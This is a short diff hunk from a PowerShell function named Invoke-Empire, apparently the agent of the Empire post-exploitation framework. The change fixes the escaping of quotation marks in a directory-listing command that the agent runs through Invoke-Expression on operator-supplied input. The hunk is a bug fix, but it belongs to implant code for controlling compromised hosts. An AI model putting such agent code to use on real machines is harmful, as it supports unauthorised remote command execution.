@@ -285,7 +285,7 @@ function Invoke-Empire {
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name=`"Owner`";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
